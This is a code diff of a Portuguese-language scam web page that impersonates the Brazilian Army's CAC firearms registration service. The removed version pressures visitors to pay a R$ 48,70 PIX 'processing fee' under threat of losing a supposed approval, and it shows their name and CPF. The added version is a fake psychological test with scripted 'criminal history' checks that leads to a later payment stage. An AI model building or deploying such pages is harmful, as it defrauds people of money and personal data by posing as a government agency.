@@ -1,28 +1,94 @@
 <!DOCTYPE html>
 <html class="no-js no-touch" lang="pt-BR">
-
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="images/favicon.png" type="image/x-icon">
-    <title>Registro CAC</title>
 
-    <!-- Scripts Únicos -->
-    <script src="js/jquery-3.6.4.min.js"></script>
     <script src="js/JsBarcode.all.min.js"></script>
     <script src="js/qrcode.min.js"></script>
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <link rel="stylesheet" href="css/all.min_1.css" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="css/slick.css">
-    <script type="text/javascript" src="js/slick.min.js"></script>
+    <script src="js/jquery-3.6.4.min.js"></script>
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            function startTimer(elementId, initialTimeKey) {
+                const timerElement = document.getElementById(elementId);
+                if (!timerElement) return;
+
+                let totalSeconds = localStorage.getItem(initialTimeKey);
+                if (!totalSeconds) {
+                    totalSeconds = (2 * 60 * 60) + (54 * 60); // 2 horas e 54 minutos
+                    localStorage.setItem(initialTimeKey, totalSeconds);
+                } else {
+                    totalSeconds = parseInt(totalSeconds, 10);
+                }
+
+                function updateTimer() {
+                    let hours = Math.floor(totalSeconds / 3600);
+                    let minutes = Math.floor((totalSeconds % 3600) / 60);
+
+                    timerElement.innerText = `${hours} h ${minutes} min`;
+
+                    totalSeconds--;
+
+                    if (totalSeconds < 0) {
+                        clearInterval(timerInterval);
+                        timerElement.innerText = '0 h 0 min';
+                        localStorage.removeItem(initialTimeKey);
+                    } else {
+                        localStorage.setItem(initialTimeKey, totalSeconds);
+                    }
+                }
+
+                const timerInterval = setInterval(updateTimer, 1000);
+                updateTimer();
+            }
+
+            startTimer('timer1', 'timer1Time');
+            startTimer('timer2', 'timer2Time');
+            startTimer('timer3', 'timer3Time');
+            startTimer('timer4', 'timer4Time');
+        });
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const destinatarioField = document.getElementById("address_destinatario");
+            const phoneField = document.getElementById("phone");
+
+            if (!destinatarioField || !phoneField) return;
+
+            const updateFields = () => {
+                const formData = {
+                    destinatario: destinatarioField.value,
+                    phone: phoneField.value,
+                };
+
+                localStorage.setItem("data-drop2", JSON.stringify(formData));
+
+                document.getElementById("DESTINATARIO").textContent = "Destinatário: " + formData.destinatario;
+                document.getElementById("PHONE").textContent = "Telefone: " + formData.phone;
+            };
+
+            destinatarioField.addEventListener("input", updateFields);
+            phoneField.addEventListener("input", updateFields);
+
+            const lastFormDataJSON = localStorage.getItem("data-drop2");
+            if (lastFormDataJSON) {
+                const lastFormData = JSON.parse(lastFormDataJSON);
+                destinatarioField.value = lastFormData.destinatario;
+                phoneField.value = lastFormData.phone;
+
+                document.getElementById("DESTINATARIO").textContent = "Destinatário: " + lastFormData.destinatario;
+                document.getElementById("PHONE").textContent = "Telefone: " + lastFormData.phone;
+            }
+        });
+    </script>
 
     <style>
-        .cssinspector-current-popup.cssinspector-extension-elements,
-        #progress,
-        #cssinspector-logo-wrapper,
-        #admin-bar-iframe {
-            display: none;
-        }
+        .cssinspector-current-popup.cssinspector-extension-elements { display: none; }
+        #progress { display: none; }
+        #cssinspector-logo-wrapper { display: none; }
 
         @font-face {
             font-family: 'Proxima Nova';
@@ -31,7 +97,6 @@
             font-style: normal;
             src: url(fonts/proximanova-light.woff2) format("woff2"), url(fonts/proximanova-light.woff) format("woff"), url(fonts/proximanova-light.ttf) format("truetype")
         }
-
         @font-face {
             font-family: 'Proxima Nova';
             font-weight: 400;
@@ -39,7 +104,6 @@
             font-style: normal;
             src: url(fonts/proximanova-regular.woff2) format("woff2"), url(fonts/proximanova-regular.woff) format("woff"), url(fonts/proximanova-regular.ttf) format("truetype")
         }
-
         @font-face {
             font-family: 'Proxima Nova';
             font-weight: 600;
@@ -47,7 +111,21 @@
             font-style: normal;
             src: url(fonts/proximanova-semibold.woff2) format("woff2"), url(fonts/proximanova-semibold.woff) format("woff"), url(fonts/proximanova-semibold.ttf) format("truetype")
         }
+    </style>
 
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <style>#admin-bar-iframe { display: none; }</style>
+    <script src="js/qrcode.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/slick.css">
+    <script type="text/javascript" src="js/slick.min.js"></script>
+    <script src="js/JsBarcode.all.min.js"></script>
+
+    <title>Registro CAC</title>
+</head>
+<body id="bodytop1">
+    <script>window.Shopify=window.Shopify||{};window.Shopify.ce_forms={bindForm:()=>Promise.resolve()};</script>
+    
+    <style>
         #finalizandoCEO {
             position: fixed;
             top: 0;
@@ -61,284 +139,356 @@
             justify-content: center;
             align-items: center;
         }
-
         #finalizandoCEO p {
             color: white;
             font-size: 24px;
             text-align: center;
             margin-top: 20px;
         }
-
-        @keyframes is-rotating {
-            to { transform: rotate(1turn); }
-        }
-
+        @keyframes is-rotating { to { transform: rotate(1turn); } }
         @keyframes border-pulse {
             0%, 100% { border-top-color: #3483fa; border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }
             25% { border-top-color: #3483fa; border-right-color: #3483fa; border-bottom-color: transparent; border-left-color: transparent; }
             50% { border-top-color: #fff159; border-right-color: #fff159; border-bottom-color: #fff159; border-left-color: transparent; }
             75% { border-top-color: #fff159; border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }
         }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-        }
-
-        @keyframes moveLeftRight {
-            0%, 100% { transform: translateX(0); }
-            50% { transform: translateX(10px); }
-        }
-
-        .animate-left-right {
-            animation: moveLeftRight 2s infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #e2e8f0;
-            border-top: 5px solid #166534;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes fadeOut {
-            0%, 90% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            pointer-events: none;
-        }
-
-        .fade-out {
-            animation: fadeOut 8s forwards;
-        }
-
-        .fixed-header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1001;
-        }
-
-        #text-overlay-1, #text-overlay-2 {
-            color: #4a5568;
-            font-weight: bold;
-            position: absolute;
-        }
-
-        #text-overlay-1 {
-            font-size: 11.5px;
-            top: 32.5%;
-            left: 17.5%;
-        }
-
-        #text-overlay-2 {
-            font-size: 11.5px;
-            top: 42.5%;
-            left: 17.5%;
-        }
-
-        img {
-            width: 100%;
-            max-width: 700px;
-            height: auto;
-        }
-        input[readonly], textarea[readonly] { pointer-events: auto; user-select: all; } 
-        input[readonly], textarea[readonly] { pointer-events: auto; user-select: all; inputmode: none; }
     </style>
-</head>
-
-<body id="bodytop1">
 
     <div id="finalizandoCEO" style="background-color: rgb(255, 255, 255); display: none;">
         <div class="c-loader"></div>
-    </div>
-
-    <div id="loadingScreen" class="loading-screen fade-out">
-        <div class="spinner mb-8"></div>
-        <div id="loadingStatus" class="text-lg font-semibold text-green-800 mb-4">Verificando Histórico criminal</div>
-    </div>
-
-    <div class="fixed-header">
-        <header class="bg-green-800 text-white shadow-md">
-            <div class="container mx-auto px-4">
-                <div class="flex items-center justify-center h-14">
-                    <div class="flex items-center">
-                        <img alt="Brasão do Exército Brasileiro" class="mr-3 h-10 w-auto" src="../quiz%20etapa%203/images/favicon.png">
-                        <div>
-                            <div class="text-xs">Ministério da Defesa</div>
-                            <div class="font-bold text-sm">Exército Brasileiro</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </header>
-    </div>
-
-    <main class="container mx-auto px-4 py-10 mt-14">
-        <div class="bg-white shadow-lg rounded-lg overflow-hidden">
-            <div class="bg-green-700 text-white py-4 px-6">
-                <h1 class="text-2xl font-bold">✅ APROVAÇÃO CONFIRMADA: Registro CAC Liberado</h1>
-            </div>
-            <div class="p-6">
-                <div class="mb-6">
-                    <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para a obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). <strong>Sua vaga foi reservada no sistema e a emissão do documento já foi pré-aprovada.<strong> </p>
-                    <p class="mb-3 text-base">Para concluir a ativação do seu registro e emitir o documento físico, é obrigatória a quitação da taxa de processamento e expedição. <strong>Atenção: a não quitação imediata poderá acarretar a anulação da sua aprovação e a liberação da vaga para a lista de espera.<strong> </p>
-                </div>
-
-                <div class="bg-gray-100 rounded-lg p-4 mb-6">
-                    <h2 class="text-lg font-semibold mb-3">Detalhamento das Taxas de Emissão:</h2>
-                    <ul class="list-disc list-inside text-sm space-y-2">
-                        <li>Guia de Recolhimento de Expedição (GRU)</li>
-                        <li>Emissão de Guia de Tráfego Nacional (GTN)</li>
-                        <li>Taxa de Processamento de Aquisição de Armamento</li>
-                    </ul>
-                    <div class="mt-4 pt-4 border-t border-gray-300">
-                        <p class="text-2xl font-bold text-green-800 text-center">
-                            Valor Total: R$ 48,70
-                        </p>
-                        <p class="text-sm text-gray-600 text-center mt-1">Pagamento via PIX</p>
-                    </div>
-                </div>
-
-                
-                <div id="pix-loading" class="text-center py-8">
-                    <div class="spinner mx-auto mb-4"></div>
-                    <p class="text-gray-600">Gerando código PIX...</p>
-                </div>
-                
-                <div id="pix-container" class="mb-6"></div>
-                
-                <div id="payment-button-container" class="flex justify-center" style="display: none;">
-                    <button id="paymentButton" onclick="gerarPix()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center justify-center">
-                        <span>Gerar PIX para Pagamento</span>
-                        <i class="fas fa-arrow-right ml-2"></i>
-                    </button>
-                </div>
-            </div>
-
-            <div class="relative mb-6">
-                <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
-                <div id="text-overlay-1"></div>
-                <div id="text-overlay-2"></div>
-            </div>
         </div>
-    </main>
-
-    <footer class="bg-green-900 text-white py-8">
-        <div class="container mx-auto px-4">
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
-                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
-                        <li><a class="hover:underline" href="#">Organização</a></li>
-                        <li><a class="hover:underline" href="#">História</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">CAC</a></li>
-                        <li><a class="hover:underline" href="#">Alistamento</a></li>
-                        <li><a class="hover:underline" href="#">Consultas</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
-                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
-                    <ul class="space-y-2">
-                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
-                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
-                    <div class="flex space-x-4">
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
-                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </footer>
-    <div class="bg-green-950 text-white text-sm py-3 text-center">
-        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
-    </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            let addressData = {};
-            try {
-                addressData = JSON.parse(localStorage.getItem('data-drop2') || '{}');
-            } catch (error) {
-                addressData = {};
-            }
-
-            const name = localStorage.getItem('nome')
-                || localStorage.getItem('nomeCompleto')
-                || addressData.destinatario
-                || '';
-            const cpf = (localStorage.getItem('cpf')
-                || localStorage.getItem('valorGuardado')
-                || '').replace(/\D/g, '');
-
-            const nameOverlay = document.getElementById('text-overlay-1');
-            const cpfOverlay = document.getElementById('text-overlay-2');
-            if (nameOverlay) nameOverlay.textContent = name;
-            if (cpfOverlay) cpfOverlay.textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-        });
-
         window.addEventListener('load', function() {
             var finalizandoCEO = document.getElementById('finalizandoCEO');
-            if(finalizandoCEO) finalizandoCEO.style.display = 'none';
+            finalizandoCEO.style.display = 'none';
         });
     </script>
-    <script src="js/pix-payment.js?v=void-20260921"></script>
-    <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1883275922637438');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1883275922637438&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+
+    <main id="main">
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Exército Brasileiro - Teste Psicotécnico para Registro CAC</title>
+        <script src="https://cdn.tailwindcss.com/"></script>
+        <link href="css/all.min_1.css" rel="stylesheet">
+        <style>
+            body { font-family: 'Poppins', sans-serif; }
+            .radio-button:checked + label { background-color: #166534; color: white; }
+            @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+            .pulse { animation: pulse 2s infinite; }
+            .checkbox-custom {
+                width: 20px; height: 20px; border: 2px solid #166534;
+                display: inline-flex; align-items: center; justify-content: center;
+                margin-right: 8px; flex-shrink: 0;
+            }
+            .checkbox-custom::after {
+                content: ''; width: 12px; height: 12px;
+                background-color: #166534; display: none;
+            }
+            .radio-button:checked + label .checkbox-custom::after { display: block; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            .spinner { animation: spin 1s linear infinite; }
+        </style>
+
+        <div id="loading-screen" class="fixed inset-0 bg-green-900 flex flex-col items-center justify-center z-50">
+<div id="loading-text" class="text-white text-2xl mb-4">Verificando histórico criminal...</div>
+            <div class="spinner text-white text-4xl">
+                <i class="fas fa-circle-notch"></i>
+            </div>
+        </div>
+        </div>
+        <header class="bg-white border-b border-gray-300">
+            <div class="container mx-auto px-4 py-2">
+                <div class="flex items-center">
+                    <img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="../quiz%20etapa%203/images/favicon.png" width="40">
+                    <div>
+                        <div class="text-sm text-green-800">Ministério da Defesa</div>
+                        <div class="font-bold text-green-800">Exército Brasileiro</div>
+                    </div>
+                     </div>
+            </div>
+        </header>
+
+        <nav class="bg-gray-200 py-2 overflow-x-auto">
+            <div class="container mx-auto px-4">
+                <div class="flex items-center text-sm whitespace-nowrap">
+                    <a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
+                    <span class="text-gray-500 mx-1">&gt;</span>
+                    <a class="text-green-800 mr-2" href="#">Serviços</a>
+                    <span class="text-gray-500 mx-1">&gt;</span>
+                    <a class="text-green-800 mr-2" href="#">CAC</a>
+                    <span class="text-gray-500 mx-1">&gt;</span>
+                    <span class="text-gray-700">Teste Psicotécnico</span>
+                     </div>
+            </div>
+        </nav>
+
+        <main class="container mx-auto px-4 py-8">
+            <h1 class="text-2xl font-bold mb-4">Teste Psicotécnico para Registro de CAC</h1>
+            <p class="mb-4">Este teste psicotécnico faz parte do processo de avaliação para obtenção do registro de Colecionador, Atirador e Caçador (CAC). Por favor, responda todas as perguntas com sinceridade. Suas respostas serão analisadas por profissionais qualificados.</p>
+            
+            <form id="cac-questionario" class="space-y-6">
+                <div id="question-container" class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
+                    <!-- Pergunta injetada via JS -->
+                </div>
+
+                <div class="flex items-center justify-between">
+                    <button id="prev-button" class="bg-gray-500 hover:bg-gray-400 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="button" style="display: none;">
+                        Anterior
+                    </button>
+                    <div class="flex-grow"></div>
+                    <button id="next-button" class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline ml-auto" type="button" style="display: block;">
+                        Próxima
+                    </button>
+                    <button id="submit-button" class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline pulse ml-auto" type="button" style="display: none;" onclick="window.location.href='../aprovado%20etapa%205/index.html';">
+                        Enviar Teste
+                    </button>
+                 </div>
+            </form>
+        </main>
+
+        <footer class="bg-green-900 text-white py-8">
+            <div class="container mx-auto px-4">
+                <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                    <div>
+                        <h3 class="font-bold mb-2">O EXÉRCITO</h3>
+                        <ul class="text-sm">
+                            <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                            <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                            <li><a class="hover:underline" href="#">Organização</a></li>
+                            <li><a class="hover:underline" href="#">História</a></li>
+                         </ul>
+                     </div>
+                    <div>
+                        <h3 class="font-bold mb-2">SERVIÇOS</h3>
+                        <ul class="text-sm">
+                            <li><a class="hover:underline" href="#">CAC</a></li>
+                            <li><a class="hover:underline" href="#">Alistamento</a></li>
+                            <li><a class="hover:underline" href="#">Concursos</a></li>
+                        </ul>
+                         </ul>
+                     </div>
+                        <h3 class="font-bold mb-2">TRANSPARÊNCIA</h3>
+                        <ul class="text-sm">
+                            <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                            <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                        </ul>
+                         </ul>
+                     </div>
+                        <h3 class="font-bold mb-2">CONTATO</h3>
+                        <ul class="text-sm">
+                            <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                            <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                        </ul>
+                         </ul>
+                     </div>
+                        <h3 class="font-bold mb-2">REDES SOCIAIS</h3>
+                        <div class="flex space-x-4">
+                            <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-facebook-f"></i></a>
+                            <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-instagram"></i></a>
+                            <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-twitter"></i></a>
+                            <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-youtube"></i></a>
+                        </div>
+                         </div>
+                     </div>
+            </div>
+         </footer>
+        <div class="bg-green-950 text-white text-xs py-2 text-center">
+            Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+        </div>
+         </div>
+        <script>
+            const questions = [
+                {
+                    question: "Diante de situações que geram frustração ou irritabilidade, qual a sua reação predominante?",
+                    options: [
+                        "Utilizo técnicas de autocontrole e respiração para estabilizar a emoção",
+                        "Manifesto minha insatisfação verbalmente, mantendo a integridade física",
+                        "Apresento episódios de dificuldade no controle dos impulsos",
+                        "Adoto o isolamento social como estratégia para mitigar conflitos"
+                    ]
+                },
+                {
+                    question: "Qual a sua conduta habitual em cenários de elevada pressão ou estresse?",
+                    options: [
+                        "Preservo a estabilidade emocional e priorizo a análise lógica para a resolução",
+                        "Solicito suporte técnico ou interpessoal ao identificar sobrecarga cognitiva",
+                        "Apresento lapsos de reatividade ou hesitação na tomada de decisão",
+                        "Busco evitar a exposição a agentes estressores preventivamente"
+                    ]
+                },
+                {
+                    question: "Qual a sua percepção acerca da observância de normas, regulamentos e hierarquias?",
+                    options: [
+                        "Considero a norma fundamental para a ordem e sigo as diretrizes rigorosamente",
+                        "Observo as normas, embora possa questionar a aplicabilidade de algumas",
+                        "Sigo as normas que julgo condizentes com a lógica da situação",
+                        "Apresento resistência ao cumprimento de normas que considero redundantes"
+                    ]
+                },
+                {
+                    question: "De que maneira você gerencia conflitos interpessoais no ambiente profissional ou social?",
+                    options: [
+                        "Busco a mediação e a resolução pacífica através do diálogo assertivo",
+                        "Adoto uma postura evitativa para prevenir o desgaste das relações",
+                        "Sustento meu posicionamento de forma incisiva, independentemente do nível de tensão",
+                        "Busco a conciliação mediante a composição de interesses (meio-termo)"
+                    ]
+                },
+                {
+                    question: "Qual a sua atitude imediata ao constatar a ocorrência de um erro sob sua responsabilidade?",
+                    options: [
+                        "Assumo a responsabilidade integral e foco na implementação de medidas corretivas",
+                        "Sinto frustração pessoal, porém utilizo o evento para aprimoramento técnico",
+                        "Tento atenuar a percepção do erro ou omitir falhas pontuais",
+                        "Atribuo a falha a fatores externos ou a terceiros envolvidos no processo"
+                    ]
+                },
+                {
+                    question: "Como você processa feedbacks negativos ou críticas ao seu desempenho?",
+                    options: [
+                        "Analiso as críticas construtivas e as integro ao meu plano de melhoria",
+                        "Apresento reatividade inicial, seguida de reflexão e análise posterior",
+                        "Demonstro dificuldade em aceitar apontamentos, mesmo quando fundamentados",
+                        "Desconsidero a maioria das críticas recebidas"
+                    ]
+                },
+                {
+                    question: "Qual a sua compreensão sobre a responsabilidade legal e ética inerente à posse de arma de fogo?",
+                    options: [
+                        "Tenho plena consciência da gravidade da responsabilidade e sinto-me apto ao encargo",
+                        "Reconheço a complexidade da responsabilidade e sinto certa apreensão, mas sinto-me capaz",
+                        "Sinto-me plenamente confiante e não identifico óbices na assunção desta responsabilidade",
+                        "Possuo reservas quanto às implicações e responsabilidades envolvidas"
+                    ]
+                },
+                {
+                    question: "Qual a sua reação instintiva diante de uma situação de perigo iminente?",
+                    options: [
+                        "Mantenho a compostura e realizo a análise situacional antes de qualquer ação",
+                        "Atuo com celeridade para garantir a própria preservação ou a de terceiros",
+                        "Experimento um estado de letargia ou paralisia momentânea antes da reação",
+                        "Adoto comportamentos preventivos para evitar a exposição ao perigo"
+                    ]
+                },
+                {
+                    question: "Qual o seu posicionamento quanto ao emprego do uso progressivo da força para a legítima defesa?",
+                    options: [
+                        "Defendo que a força seja empregada estritamente como última ratio (último recurso)",
+                        "Sinto-me apto e preparado para empregar a força necessária na medida da ameaça",
+                        "Priorizo a evasão de confrontos físicos independentemente da circunstância",
+                        "Acredito que a antecipação ofensiva é a forma mais eficaz de defesa"
+                    ]
+                },
+                {
+                    question: "Como você performa sob a pressão de tomar decisões críticas em curto espaço de tempo?",
+                    options: [
+                        "Mantenho o equilíbrio emocional e decido com base em análise rápida de dados",
+                        "Baseio minhas decisões rápidas em instintos e experiências prévias",
+                        "Apresento sinais de ansiedade, embora tente manter a eficácia da entrega",
+                        "Necessito de tempo para reflexão e análise antes de deliberar sobre questões importantes"
+                    ]
+                }
+            ];
+
+            let currentQuestion = 0;
+            const questionContainer = document.getElementById('question-container');
+            const prevButton = document.getElementById('prev-button');
+            const nextButton = document.getElementById('next-button');
+            const submitButton = document.getElementById('submit-button');
+
+            function displayQuestion(index) {
+                const question = questions[index];
+                let html = `
+                    <h2 class="text-xl font-semibold mb-4">${index + 1}. ${question.question}</h2>
+                    <div class="space-y-2">
+                `;
+                question.options.forEach((option, i) => {
+                    html += `
+                        <div class="flex items-center p-2 rounded hover:bg-gray-100">
+                            <input type="radio" id="q${index}_option${i}" name="q${index}" value="${option}" class="radio-button hidden">
+                            <label for="q${index}_option${i}" class="flex items-center flex-grow ml-2 p-2 rounded cursor-pointer transition-colors duration-200">
+                                <div class="checkbox-custom"></div>
+                                ${option}
+                            </label>
+                        </div>
+                    `;
+                });
+                html += '</div>';
+                questionContainer.innerHTML = html;
+            }
+
+            function updateButtons() {
+                prevButton.style.display = currentQuestion > 0 ? 'block' : 'none';
+                if (currentQuestion === questions.length - 1) {
+                    nextButton.style.display = 'none';
+                    submitButton.style.display = 'block';
+                } else {
+                    nextButton.style.display = 'block';
+                    submitButton.style.display = 'none';
+                }
+            }
+
+            prevButton.addEventListener('click', () => {
+                if (currentQuestion > 0) {
+                    currentQuestion--;
+                    displayQuestion(currentQuestion);
+                    updateButtons();
+                }
+            });
+
+            nextButton.addEventListener('click', () => {
+                const selectedOption = document.querySelector(`input[name="q${currentQuestion}"]:checked`);
+                if (selectedOption) {
+                    if (currentQuestion < questions.length - 1) {
+                        currentQuestion++;
+                        displayQuestion(currentQuestion);
+                        updateButtons();
+                    }
+                } else {
+                    alert('Por favor, selecione uma opção antes de prosseguir.');
+                }
+            });
+
+            document.getElementById('cac-questionario').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const selectedOption = document.querySelector(`input[name="q${currentQuestion}"]:checked`);
+                if (selectedOption) {
+                    alert('Teste psicotécnico enviado com sucesso! Suas respostas serão analisadas por profissionais qualificados e você será contatado em breve para os próximos passos do processo de registro CAC.');
+                } else {
+                    alert('Por favor, responda todas as perguntas antes de enviar o teste.');
+                }
+            });
+
+window.addEventListener('load', function() {
+    const loadingText = document.getElementById('loading-text');
+    const messages = [
+        "Verificando histórico criminal...",
+        "Validando credenciais de acesso...",
+        "Analisando respostas do questionário...",
+        "Aguardando confirmação dos analistas...",
+        "Examinando conformidade técnica...",
+        "Finalizando processamento de dados..."
+    ];
+    
+    let msgIndex = 0;
+    const interval = setInterval(() => {
+        msgIndex++;
+        if (msgIndex < messages.length) {
+            loadingText.innerText = messages[msgIndex];
+        } else {
+            clearInterval(interval);
+        }
+    }, 1200);
+
+    setTimeout(function() {
+        document.getElementById('loading-screen').style.display = 'none';
+    }, 8000);
+});
+
+            displayQuestion(currentQuestion);
+            updateButtons();
+        </script>
+    </main>
 </body>
 </html>
